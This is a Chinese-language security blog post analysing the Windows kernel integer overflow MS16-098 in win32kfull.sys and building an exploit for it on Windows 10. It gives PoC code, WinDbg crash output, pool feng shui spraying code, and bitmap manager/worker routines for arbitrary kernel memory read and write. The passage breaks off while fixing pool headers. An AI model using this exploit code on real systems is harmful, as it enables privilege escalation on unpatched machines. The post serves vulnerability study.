<!DOCTYPE html>


<html xmlns:wb="http://open.weibo.com/wb">

<head>
  <meta charset="utf-8"/>
  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
  <meta property="wb:webmaster" content="ccd3e79934f3322d"/>
  <title>Windows 10下MS16-098 RGNOBJ整数溢出漏洞分析及利用</title>
  <meta name="keywords" content="漏洞文档,漏洞分析,安全技术"/>
  <meta name="description" content=""/>

  <meta name="HandheldFriendly" content="True"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>

  <link rel="shortcut icon" href="/static/images/favicon.ico">
  <link rel="stylesheet" type="text/css" href="/static/css/screen.css"/>
  <link rel="stylesheet" type="text/css" href="/static/css/font.css"/>
  <link rel="stylesheet"
        href="//libs.baidu.com/fontawesome/4.0.3/css/font-awesome.min.css">
  <link rel="stylesheet" type="text/css" href="/static/css/prism.css"/>
  <link rel="stylesheet" type="text/css" href="/static/css/monokai.css" media="screen"/>
  <link rel="stylesheet" type="text/css" href="/static/css/custom.css?t=20170821"/>
  <link rel="stylesheet" type="text/css" href="/static/css/print.css?t=20170821" media="print"/>
  <script>
    var _hmt = _hmt || [];
    (function () {
      var hm = document.createElement("script");
      hm.src = "//hm.baidu.com/hm.js?ef67a70a7641da3b52452a05b3bbecae";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>


</head>

<body class="home-template">
<div class="weixin-share-img" style="display: none">
  <img src="/static/images/weixin-share.png" alt="Paper"/>
</div>

<div id="wrapper" class="">

<div id="sidebar">
  <button type="button" class="hamburger is-closed" data-toggle="offcanvas">
    <span class="hamb-top"></span>
    <span class="hamb-middle"></span>
    <span class="hamb-bottom"></span>
  </button>
  <div id="sidebar-content" class="inner">
    <h2 class="blog-title"><a href="/">Paper</a></h2>
    <h3 class="blog-description">安全技术精粹</h3>

    <form id="search" action="/">
      <button type="submit" style="background: #13313f; border: #13313f; position: absolute; right: -4px; margin-top: -3px;">
        <i class="fa fa-search search-button" style="position: absolute;right:10px; margin-top:6px;" > </i>
      </button>
      <input id="search-field" name="keyword" value="" placeholder="Search"/>

    </form>
    <div class="overlay"></div>
    <div id="sidebar-links">
      <ul id="subscription-links">
        <li><a target="_blank" href="/rss/"><i class="fa fa-rss"></i>RSS 订阅</a>
        </li>
        <li><a href="https://www.seebug.org/contribute/paper"><i
            class="fa fa-envelope-o"></i>投稿</a></li>
      </ul>
      <ul id="navigation">
        <li class="nav-" role="presentation"><a href="/"><i
            class="fa fa-angle-right"></i>首页</a></li>
        
  <li class="nav-" role="presentation"><a href="/category/vul-analysis/"><i
      class="fa fa-angle-right"></i>漏洞分析</a></li>

  <li class="nav-" role="presentation"><a href="/category/tools/"><i
      class="fa fa-angle-right"></i>安全工具&amp;安全开发</a></li>

  <li class="nav-" role="presentation"><a href="/category/information/"><i
      class="fa fa-angle-right"></i>情报分析</a></li>

  <li class="nav-" role="presentation"><a href="/category/experience/"><i
      class="fa fa-angle-right"></i>经验心得</a></li>

  <li class="nav-" role="presentation"><a href="/category/web-security/"><i
      class="fa fa-angle-right"></i>Web安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/bin-security/"><i
      class="fa fa-angle-right"></i>二进制安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/mobile-security/"><i
      class="fa fa-angle-right"></i>移动安全</a></li>

  <li class="nav-" role="presentation"><a href="/category/paper-archive/"><i
      class="fa fa-angle-right"></i>纸篓</a></li>

  <li class="nav-" role="presentation"><a href="/category/prime/"><i
      class="fa fa-angle-right"></i>安全基础&amp;教学篇</a></li>


        <li class="nav-" role="presentation"><a href="/call-for-paper/"><i
            class="fa fa-angle-right"></i>如何投稿</a></li>
        <li class="nav-" role="presentation"><a href="https://paper.seebug.org/papers/"><i
            class="fa fa-angle-right"></i>归档文件</a></li>
      </ul>
      <ul id="sidebar-external">
      </ul>
    </div>

    <footer class="site-footer">
      <section class="copyright">Copyright @ 404 Team from Knownsec.</section>
    </footer>
  </div>
</div>

<main>
  <div class="main-inner">
    <section id="results"></section>
    
  <article class="">
    <header class="post-header">

      <h1 class="post-title">Windows 10下MS16-098 RGNOBJ整数溢出漏洞分析及利用</h1>

      <span class="post-print">
        <a href="javascript:window.print()">
        <i class="fa fa-print fa-2x" aria-hidden="true"></i>
        </a>
      </span>
      <section class="post-meta">
        <span class="post-time">
          <i class='fa fa-calendar'></i>
          <time datetime="2017-06-12" class="timeago">3 月，1 周 之前</time>
          <time datetime="2017-06-12" class="fulldate">六月 12, 2017</time>
        </span>
        
          <br>
          <i class='fa fa-tag'></i>
          
            <a href="/category/vul-analysis/">漏洞分析</a>
            
          
        








      </section>
    </header>

    <section class="post-content">
      <p><input type="hidden" class="Authorrss"  value="bird@TSRC" name="bird@TSRC" /></p>
<p>作者：<a href="https://security.tencent.com/index.php/blog/msg/117"><strong>bird@TSRC</strong></a></p>
<h4>1. 前言</h4>
<p>此篇文章参考<a href="https://sensepost.com/blog/2017/exploiting-ms16-098-rgnobj-integer-overflow-on-windows-8.1-x64-bit-by-abusing-gdi-objects/">《Exploiting MS16-098 RGNOBJ Integer Overflow on Windows 8.1 x64 bit by abusing GDI objects》</a>，文中讲到了 Windows Kernel Pool 风水、SetBitmapBits/GetBitmapBits 来进行任意地址的读写等利用手段，非常有助于学习 Windows 内核的漏洞利用。</p>
<blockquote>
<p>测试环境：Windows 10 1511 x64 专业版(2016.04)</p>
</blockquote>
<h4>2. 漏洞分析</h4>
<p>漏洞是发生在 <code>win32kfull.sys</code> 的 <code>bFill</code> 函数当中</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/06/1-1.png-w331s" /></p>
<p>如果 <code>eax &gt; 0x14</code> 就会执行 <code>lea ecx, [rax+rax*2]; shl ecx, 4</code> ，这里就可能导致整数溢出使之后
 <code>PALLOCMEM2</code> 时实际申请的是一个很小的 <code>pool</code> ，最后可能导致 <code>pool overflow</code>.</p>
<p>下面是触发漏洞的PoC</p>
<div class="codehilite"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;Windows.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;wingdi.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;winddi.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;time.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;Psapi.h&gt;</span><span class="cp"></span>

<span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
    <span class="c1">//Create a Point array</span>
    <span class="k">static</span> <span class="n">POINT</span> <span class="n">points</span><span class="p">[</span><span class="mh">0x3fe01</span><span class="p">];</span>
    <span class="n">points</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">x</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">points</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">y</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="c1">// Get Device context of desktop hwnd</span>
    <span class="n">HDC</span> <span class="n">hdc</span> <span class="o">=</span> <span class="n">GetDC</span><span class="p">(</span><span class="nb">NULL</span><span class="p">);</span>
    <span class="c1">// Get a compatible Device Context to assign Bitmap to</span>
    <span class="n">HDC</span> <span class="n">hMemDC</span> <span class="o">=</span> <span class="n">CreateCompatibleDC</span><span class="p">(</span><span class="n">hdc</span><span class="p">);</span>
    <span class="c1">// Create Bitmap Object</span>
    <span class="n">HGDIOBJ</span> <span class="n">bitmap</span> <span class="o">=</span> <span class="n">CreateBitmap</span><span class="p">(</span><span class="mh">0x5a</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="c1">// Select the Bitmap into the Compatible DC</span>
    <span class="n">HGDIOBJ</span> <span class="n">bitobj</span> <span class="o">=</span> <span class="p">(</span><span class="n">HGDIOBJ</span><span class="p">)</span><span class="n">SelectObject</span><span class="p">(</span><span class="n">hMemDC</span><span class="p">,</span> <span class="n">bitmap</span><span class="p">);</span>
    <span class="c1">//Begin path</span>
    <span class="n">BeginPath</span><span class="p">(</span><span class="n">hMemDC</span><span class="p">);</span>
    <span class="c1">// Calling PolylineTo 0x156 times with PolylineTo points of size 0x3fe01.</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mh">0x156</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">PolylineTo</span><span class="p">(</span><span class="n">hMemDC</span><span class="p">,</span> <span class="n">points</span><span class="p">,</span> <span class="mh">0x3FE01</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="c1">// End the path</span>
    <span class="n">EndPath</span><span class="p">(</span><span class="n">hMemDC</span><span class="p">);</span>
    <span class="c1">// Fill the path</span>
    <span class="n">FillPath</span><span class="p">(</span><span class="n">hMemDC</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>


<p>这里多次调用 <code>PolylineTo</code> 可以让 <code>eax</code> 到达一个较大的值， <code>0x156 * 0x3FE01 = 0x5555556; (0x5555556 + 1) * 3 = 0x10000005; 0x10000005 &lt;&lt; 4 = 0x00000050</code> 最终得到 <code>ecx</code> 的值为 <code>0x50</code>.</p>
<div class="codehilite"><pre><span></span><span class="mi">2</span><span class="o">:</span> <span class="n">kd</span><span class="o">&gt;</span> <span class="n">r</span>
<span class="n">rax</span><span class="o">=</span><span class="mi">0000000005555557</span> <span class="n">rbx</span><span class="o">=</span><span class="n">ffffd00023f7da70</span> <span class="n">rcx</span><span class="o">=</span><span class="mi">0000000000000050</span>
<span class="n">rdx</span><span class="o">=</span><span class="mi">0000000067646547</span> <span class="n">rsi</span><span class="o">=</span><span class="n">ffffd00023f7da70</span> <span class="n">rdi</span><span class="o">=</span><span class="mi">0000000000000000</span>
<span class="n">rip</span><span class="o">=</span><span class="n">fffff961b6ac92a8</span> <span class="n">rsp</span><span class="o">=</span><span class="n">ffffd00023f7cba0</span> <span class="n">rbp</span><span class="o">=</span><span class="n">ffffd00023f7d300</span>
 <span class="n">r8</span><span class="o">=</span><span class="mi">0000000000000000</span>  <span class="n">r9</span><span class="o">=</span><span class="n">fffff961b685d8a0</span> <span class="n">r10</span><span class="o">=</span><span class="n">ffffd00023f7da70</span>
<span class="n">r11</span><span class="o">=</span><span class="n">ffffd00023f7d934</span> <span class="n">r12</span><span class="o">=</span><span class="n">ffffd00023f7d410</span> <span class="n">r13</span><span class="o">=</span><span class="n">ffffd00023f7d410</span>
<span class="n">r14</span><span class="o">=</span><span class="n">ffffd00023f7da70</span> <span class="n">r15</span><span class="o">=</span><span class="n">fffff961b685d8a0</span>
<span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">po</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">0010</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">0018</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">002</span><span class="n">b</span>  <span class="n">es</span><span class="o">=</span><span class="mi">002</span><span class="n">b</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">0053</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">002</span><span class="n">b</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00000246</span>
<span class="n">win32kfull</span><span class="o">!</span><span class="n">bFill</span><span class="o">+</span><span class="mh">0x3e4</span><span class="o">:</span>
<span class="n">fffff961</span><span class="err">`</span><span class="n">b6ac92a8</span> <span class="n">e8f7b2daff</span>      <span class="n">call</span>    <span class="n">win32kfull</span><span class="o">!</span><span class="n">PALLOCMEM2</span> <span class="o">(</span><span class="n">fffff961</span><span class="err">`</span><span class="n">b68745a4</span><span class="o">)</span>
</pre></div>


<p>之后通过 <code>AddEdgeToGet</code> 函数向这个申请的 <code>pool</code> 写入数据时发生了 <code>overflow</code> ，破坏了下一个的
 <code>pool header</code> ，在 <code>bFill</code> 函数的结尾执行 <code>Win32FreePool</code> 时导致了 <code>BSoD</code>.</p>
<div class="codehilite"><pre><span></span>Use !analyze -v to get detailed debugging information.

BugCheck 19, {20, fffff901424f8370, fffff901424f83d0, 25060037}

*** WARNING: Unable to verify checksum for ms16-098-win10.exe
*** ERROR: Module load completed but symbols could not be loaded for ms16-098-win10.exe
Probably caused by : win32kbase.sys ( win32kbase!Win32FreePool+1a )

Followup:     MachineOwner
---------

nt!DbgBreakPointWithStatus:
fffff801`9c7c8bd0 cc              int     3
0: kd&gt; !analyze -v
*******************************************************************************
*                                                                             *
*                        Bugcheck Analysis                                    *
*                                                                             *
*******************************************************************************

BAD_POOL_HEADER (19)
The pool is already corrupt at the time of the current request.
This may or may not be due to the caller.
The internal pool links must be walked to figure out a possible cause of
the problem, and then special pool applied to the suspect tags or the driver
verifier to a suspect driver.
Arguments:
Arg1: 0000000000000020, a pool block header size is corrupt.
Arg2: fffff901424f8370, The pool entry we were looking for within the page.
Arg3: fffff901424f83d0, The next pool entry.
Arg4: 0000000025060037, (reserved)
</pre></div>


<h4>3. 漏洞利用</h4>
<h6>3.1 Kernel Pool 风水</h6>
<p>这一步要特别注意的是申请的 <code>POOL TYPE</code> 要一致，这里都是 <code>Paged Session Pool</code> .</p>
<div class="codehilite"><pre><span></span>HBITMAP bmp;
// Allocating 5000 Bitmaps of size 0xf80 leaving 0x80 space at end of page.
for (int k = 0; k &lt; 5000; k++) {
    bmp = CreateBitmap(1670, 2, 1, 8, NULL);    // 1680 = 0xf80
    bitmaps[k] = bmp;
}

HACCEL hAccel, hAccel2;
LPACCEL lpAccel;
// Initial setup for pool fengshui.  
lpAccel = (LPACCEL)malloc(sizeof(ACCEL));
SecureZeroMemory(lpAccel, sizeof(ACCEL));
// Allocating  7000 accelerator tables of size 0x40 0x40 *2 = 0x80 filling in the space at end of page.
HACCEL *pAccels = (HACCEL *)malloc(sizeof(HACCEL) * 7000);
HACCEL *pAccels2 = (HACCEL *)malloc(sizeof(HACCEL) * 7000);
for (INT i = 0; i &lt; 7000; i++) {
    hAccel = CreateAcceleratorTableA(lpAccel, 1);
    hAccel2 = CreateAcceleratorTableW(lpAccel, 1);
    pAccels[i] = hAccel;
    pAccels2[i] = hAccel2;
}
</pre></div>


<p>把 <code>4K</code> 的页分成了 <code>0xf80</code>、<code>0x40</code>、<code>0x40</code> 三部分</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/06/2-1.png-w331s" /></p>
<p>内存布局</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/06/3-1.png-w331s" /></p>
<p>释放掉 <code>0xf80</code> 的空间，再分别申请 <code>0xbc0</code> 和 <code>0x3c0</code> 大小的空间</p>
<div class="codehilite"><pre><span></span>// Delete the allocated bitmaps to free space at beiginig of pages
for (int k = 0; k &lt; 5000; k++) {
    DeleteObject(bitmaps[k]);
}
//allocate Gh04 5000 region objects of size 0xbc0 which will reuse the free-ed bitmaps memory.
for (int k = 0; k &lt; 5000; k++) {
    CreateEllipticRgn(0x79, 0x79, 1, 1);    //size = 0xbc0
}
// Allocate Gh05 5000 bitmaps which would be adjacent to the Gh04 objects previously allocated
for (int k = 0; k &lt; 5000; k++) {
    bmp = CreateBitmap(0x53, 1, 1, 32, NULL);   //size = 3c0
    bitmaps[k] = bmp;
}
</pre></div>


<p>这时把 <code>0xf80</code> 分隔成了 <code>0xbc0</code> 和 <code>0x3c0</code></p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/06/4-1.png-w331s" /></p>
<p>由于 <code>PALLOCMEM2(0x50)</code> 申请的空间大小加上 <code>header</code> 实际是 <code>0x60</code> ，因此先把任何大小为 <code>0x60</code> 的空闲空间都进行占位</p>
<div class="codehilite"><pre><span></span>void AllocateClipBoard2(unsigned int size) {
    BYTE *buffer;
    buffer = malloc(size);
    memset(buffer, 0x41, size);
    buffer[size - 1] = 0x00;
    const size_t len = size;
    HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, len);
    memcpy(GlobalLock(hMem), buffer, len);
    GlobalUnlock(hMem);
    SetClipboardData(CF_TEXT, hMem);
}

// Allocate 17500 clipboard objects of size 0x60 to fill any free memory locations of size 0x60
for (int k = 0; k &lt; 1700; k++) { //1500
    AllocateClipBoard2(0x30);
}
</pre></div>


<p>最后释放掉中间页末尾的两个大小为 <code>0x40</code> 的空闲空间</p>
<div class="codehilite"><pre><span></span>// delete 2000 of the allocated accelerator tables to make holes at the end of the page in our spray.
for (int k = 2000; k &lt; 4000; k++) {
    DestroyAcceleratorTable(pAccels[k]);
    DestroyAcceleratorTable(pAccels2[k]);
}
</pre></div>


<p><img alt="" src="https://images.seebug.org/content/images/2017/06/13-1.png-w331s" /></p>
<p>最后的内存布局</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/06/5-2.png-w331s" /></p>
<h6>3.2 借助 Bitmap GDI Object 实现任意地址的读写</h6>
<p>不出意外的话， <code>PALLOCMEM2(0x50)</code> 申请到的内存会是上一步释放的页末尾的 <code>0x80</code> 中的一部分，之后就是考虑怎么覆盖下一页中 <code>Bitmap GDI Object</code> 的属性， <code>PolylineTo</code> 函数中对于相同的 <code>POINT</code> 只会复制一次，再看 <code>AddEdgeToGet</code> 函数中。</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/06/6-1.png-w331s" /></p>
<p>如果当前 <code>point.y</code> 小于前一个 <code>point.y</code> ，就会把当前 <code>buffer+0x28</code> 地址处赋值为 <code>0xffffffff</code> </p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/06/7-1.png-w331s" /></p>
<p>如果当前 <code>point.y &lt;&lt; 4</code>小于<code>[rdi+0xc] = 0x1f0</code> ，就会进入处理 <code>point.x</code> 的分支</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/06/8-1.png-w331s" /></p>
<p>之后如果当前 <code>point.x</code> 小于前一个 <code>point.x</code> ，就会把当前 <code>buffer+0x24</code> 地址处赋值为 <code>0x1</code> </p>
<div class="codehilite"><pre><span></span><span class="nt">static</span> <span class="nt">POINT</span> <span class="nt">points</span><span class="cp">[</span><span class="mh">0x3fe01</span><span class="cp">]</span><span class="o">;</span>

<span class="nt">for</span> <span class="o">(</span><span class="nt">int</span> <span class="nt">l</span> <span class="o">=</span> <span class="nt">0</span><span class="o">;</span> <span class="nt">l</span> <span class="o">&lt;</span> <span class="nt">0x3FE00</span><span class="o">;</span> <span class="nt">l</span><span class="o">++)</span> <span class="p">{</span>
    <span class="err">points</span><span class="cp">[</span><span class="nx">l</span><span class="cp">]</span><span class="err">.x</span> <span class="err">=</span> <span class="err">0x5a1f</span><span class="p">;</span>
    <span class="err">points</span><span class="cp">[</span><span class="nx">l</span><span class="cp">]</span><span class="err">.y</span> <span class="err">=</span> <span class="err">0x5a1f</span><span class="p">;</span>
<span class="p">}</span>
<span class="nt">points</span><span class="cp">[</span><span class="mi">2</span><span class="cp">]</span><span class="p">.</span><span class="nc">y</span> <span class="o">=</span> <span class="nt">20</span><span class="o">;</span>
<span class="nt">points</span><span class="cp">[</span><span class="mh">0x3FE00</span><span class="cp">]</span><span class="p">.</span><span class="nc">x</span> <span class="o">=</span> <span class="nt">0x4a1f</span><span class="o">;</span>
<span class="nt">points</span><span class="cp">[</span><span class="mh">0x3FE00</span><span class="cp">]</span><span class="p">.</span><span class="nc">y</span> <span class="o">=</span> <span class="nt">0x6a1f</span><span class="o">;</span>

<span class="nt">for</span> <span class="o">(</span><span class="nt">int</span> <span class="nt">j</span> <span class="o">=</span> <span class="nt">0</span><span class="o">;</span> <span class="nt">j</span> <span class="o">&lt;</span> <span class="nt">0x156</span><span class="o">;</span> <span class="nt">j</span><span class="o">++)</span> <span class="p">{</span>
    <span class="err">if</span> <span class="err">(j</span> <span class="err">&gt;</span> <span class="err">0x1F</span> <span class="err">&amp;&amp;</span> <span class="err">points</span><span class="cp">[</span><span class="mi">2</span><span class="cp">]</span><span class="err">.y</span> <span class="err">!=</span> <span class="err">0x5a1f)</span> <span class="err">{</span>
        <span class="err">points</span><span class="cp">[</span><span class="mi">2</span><span class="cp">]</span><span class="err">.y</span> <span class="err">=</span> <span class="err">0x5a1f</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="nt">if</span> <span class="o">(!</span><span class="nt">PolylineTo</span><span class="o">(</span><span class="nt">hMemDC</span><span class="o">,</span> <span class="nt">points</span><span class="o">,</span> <span class="nt">0x3FE01</span><span class="o">))</span> <span class="p">{</span>
        <span class="err">fprintf(stderr,</span> <span class="err">&quot;</span><span class="cp">[</span><span class="o">!</span><span class="cp">]</span> <span class="err">PolylineTo()</span> <span class="n">Failed</span><span class="p">:</span> <span class="o">%</span><span class="n">x</span><span class="err">\</span><span class="n">r</span><span class="err">\</span><span class="n">n</span><span class="err">&quot;</span><span class="p">,</span> <span class="nf">GetLastError</span><span class="p">());</span>
    <span class="p">}</span>
<span class="err">}</span>
</pre></div>


<p>这样刚好覆盖下一页中 <code>Bitmap GDI Object</code> 中的 <code>hdev</code> 和 <code>sizlBitmap</code> 中的 <code>width</code> 属性</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/06/9-1.png-w331s" /></p>
<p>复制完成后</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/06/10-1.png-w331s" /></p>
<p>由于 <code>width</code> 覆盖为了 <code>0xffffffff</code> ，导致buffer的读写空间非常大，这时就能把这个 <code>object</code> 作为
 <code>manager</code> ，下下一页中的 <code>Bitmap GDI Object</code> 作为 <code>worker</code> ，通过 <code>SetBitmapBits</code> 修改
 <code>worker</code> 的 <code>pvScan0</code> 属性（相当于 buffer 地址）来设置想读写的地址，再对 <code>worker</code> 调用
 <code>SetBitmapBits</code> 、 <code>GetBitmapBits</code> 来进行任意地址读写。</p>
<div class="codehilite"><pre><span></span>void SetAddress(BYTE* address) {
    for (int i = 0; i &lt; sizeof(address); i++) {
        bits[0xdf8 + i] = address[i];
    }
    SetBitmapBits(hManager, 0x1000, bits);
}

void WriteToAddress(BYTE* data, DWORD len) {
    SetBitmapBits(hWorker, len, data);
}

LONG ReadFromAddress(ULONG64 src, BYTE* dst, DWORD len) {
    SetAddress((BYTE *)&amp;src);
    return GetBitmapBits(hWorker, len, dst);
}
</pre></div>


<p>由于覆盖了 <code>hdev</code> 属性，在 <code>GetBitmapBits</code> 时会在 <code>PDEVOBJ::bAllowShareAccess</code> 函数中判断
 <code>0x0000000100000000</code> 地址处的值是否为 <code>0x1</code> .</p>
<p><img alt="" src="https://images.seebug.org/content/images/2017/06/11-1.png-w331s" /></p>
<p>因此申请一块 <code>0x0000000100000000</code> 地址处的内存并赋值为 <code>0x1</code> 使 <code>PDEVOBJ::bAllowShareAccess</code> 函数返回 <code>0</code> </p>
<div class="codehilite"><pre><span></span>VOID *fake = VirtualAlloc(0x0000000100000000, 0x100, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
memset(fake, 0x1, 0x100);
</pre></div>


<p>另外还需要修复下一页中 <code>region</code> 和 <code>bitmap gdi</code> 对象的 <code>pool header</code></p>
<div class="codehilite"><pre><span></span><span class="o">//</span> <span class="nt">Get</span> <span class="nt">Gh04</span> <span class="nt">header</span> <span class="nt">to</span> <span class="nt">fix</span> <span class="nt">overflown</span> <span class="nt">header</span><span class="o">.</span>
<span class="nt">static</span> <span class="nt">BYTE</span> <span class="nt">Gh04</span><span class="cp">[</span><span class="mh">0x10</span><span class="cp">]</span><span class="o">;</span>
<span class="nt">fprintf</span><span class="o">(</span><span class="nt">stdout</span><span class="o">,</span> <span class="s2">&quot;\r\nGh04 header:\r\n&quot;</span><span class="o">);</span>
<span class="nt">for</span> <span class="o">(</span><span class="nt">int</span> <span class="nt">i</span> <span class="o">=</span> <span class="nt">0</span><span class="o">;</span> <span class="nt">i</span> <span class="o">&lt;</span> <span class="nt">0x10</span><span class="o">;</span> <span class="nt">i</span><span class="o">++)</span> <span class="p">{</span>
    <span class="err">Gh04</span><span class="cp">[</span><span class="nx">i</span><span class="cp">]</span> <span class="err">=</span> <span class="err">bits</span><span class="cp">[</span><span class="mh">0x1d8</span> <span class="o">+</span> <span class="nx">i</span><span class="cp">]</span><span class="p">;</span>
    <span class="err">fprintf(stdout,</span> <span class="err">&quot;%02x&quot;,</span> <span class="err">bits</span><span class="cp">[</span><span class="mh">0x1d8</span> <span class="o">+</span> <span class="nx">i</span><span class="cp">]</span><span class="err">)</span><span class="p">;</span>
<span class="p">}</span>

<span class="o">//</span> <span class="nt">Get</span> <span class="nt">Gh05</span> <span class="nt">header</span> <span class="nt">to</span> <span class="nt">fix</span> <span class="nt">overflown</span> <span class="nt">header</span><span class="o">.</span>
<span class="nt">static</span> <span class="nt">BYTE</span> <span class="nt">Gh05</span><span class="cp">[</span><span class="mh">0x10</span><span class="cp">]</span><span class="o">;</span>
<span class="nt">fprintf</span><span class="o">(</span><span class="nt">stdout</span><span class="o">,</span> <span class="s2">&quot;\r\nGh05 header:\r\n&quot;</span><span class="o">);</span>
<span class="nt">for</span> <span class="o">(</span><span class="nt">int</span> <span class="nt">i</span> <span class="o">=</span> <span class="nt">0</span><span class="o">;</span> <span class="nt">i</span> <span class="o">&lt;</span> <span class="nt">0x10</span><span class="o">;</span> <span class="nt">i</span><span class="o">++)</span> <span class="p">{</span>
    <span class="err">Gh05</span><span class="cp">[</span><span class="nx">i</span><span class="cp">]</span> <span class="err">=</span> <span class="err">bits</span><span class="cp">[</span><span class="mh">0xd98</span> <span class="o">+</span> <span class="nx">i</span><span class="cp">]</span><span class="p">;</span>
    <span class="err">fprintf(stdout,</span> <span class="err">&quot;%02x&quot;,</span> <span class="err">bits</span><span class="cp">[</span><span class="mh">0xd98</span> <span class="o">+</span> <span class="nx">i</span><span class="cp">]</span><span class="err">)</span><span class="p">;</span>
<span class="p">}</span>

<span class="o">//</span> <span class="nt">Address</span> <span class="nt">of</span> <span class="nt">Overflown</span> <span class="nt">Gh04</span> <span class="nt">object</span> <span class="nt">header</span>
<span class="nt">static</span> <span class="nt">BYTE</span> <span class="nt">addr1</span><span class="cp">[</span><span class="mh">0x8</span><span class="cp">]</span><span class="o">;</span>
<span class="nt">fprintf</span><span class="o">(</span><span class="nt">stdout</span><span class="o">,</span> <span class="s2">&quot;\r\nPrevious page Gh04 (Leaked address):\r\n&quot;</span><span class="o">);</span>
<span class="nt">for</span> <span class="o">(</span><span class="nt">int</span> <span class="nt">j</span> <span class="o">=</span> <span class="nt">0</span><span class="o">;</span> <span class="nt">j</span> <span class="o">&lt;</span> <span class="nt">0x8</span><span class="o">;</span> <span class="nt">j</span><span class="o">++)</span> <span class="p">{</span>
    <span class="err">addr1</span><span class="cp">[</span><span class="nx">j</span><span class="cp">]</span> <span class="err">=</span> <span class="err">bits</span><span class="cp">[</span><span class="mh">0x218</span> <span class="o">+</span> <span class="nx">j</span><span class="cp">]</span><span class="p">;</span>
    <span class="err">fprintf(stdout,</span> <span class="err">&quot;%02x&quot;,</span> <span class="err">bits</span><span class="cp">[</span><span class="mh">0x218</span> <span class="o">+</span> <span class="nx">j</span><span class="cp">]</span><span class="err">)</span><span class="p">;</span>
<span class="p">}</span>
<span class="o">//</span> <span class="nt">Get</span> <span class="nt">pvScan0</span> <span class="nt">address</span> <span class="nt">of</span> <span class="nt">second</span> <span class="nt">Gh05</span> <span class="nt">object</span>
<span class="nt">static</span> <span class="nt">BYTE</span> <span class="nt">pvscan</span><span class="cp">[</span><span class="mh">0x08</span><span class="cp">]</span><span class="o">;</span>
<span class="nt">fprintf</span><span class="o">(</span><span class="nt">stdout</span><span class="o">,</span> <span class="s2">&quot;\r\npvScan0:\r\n&quot;</span><span class="o">);</span>
<span class="nt">for</span> <span class="o">(</span><span class="nt">int</span> <span class="nt">i</span> <span class="o">=</span> <span class="nt">0</span><span class="o">;</span> <span class="nt">i</span> <span class="o">&lt;</span> <span class="nt">0x8</span><span class="o">;</span> <span class="nt">i</span><span class="o">++)</span> <span class="p">{</span>
    <span class="err">pvscan</span><span class="cp">[</span><span class="nx">i</span><span class="cp">]</span> <span class="err">=</span> <span class="err">bits</span><span class="cp">[</span><span class="mh">0xdf8</span> <span class="o">+</span> <span class="nx">i</span><span class="cp">]</span><span class="p">;</span>
    <span class="err">fprintf(stdout,</span> <span class="err">&quot;%02x&quot;,</span> <span class="err">bits</span><span class="cp">[</span><span class="mh">0xdf8</span> <span class="o">+</span> <span class="nx">i</span><span class="cp">]</span><span class="err">)</span><span class="p">;</span>
<span class="p">}</span>

<span class="o">//</span> <span class="nt">Calculate</span> <span class="nt">address</span> <span class="nt">to</span> <span class="nt">overflown</span> <span class="nt">Gh04</span> <span class="nt">object</span> <span class="nt">header</span><span class="o">.</span>
<span class="nt">addr1</span><span class="cp">[</span><span class="mh">0x0</span><span class="cp">]</span> <span class="o">=</span> <span class="nt">0</span><span class="o">;</span>
<span class="nt">int</span> <span class="nt">u</span> <span class="o">=</span> <span class="nt">addr1</span><span class="cp">[</span><span class="mh">0x1</span><span class="cp">]</span><span class="o">;</span>
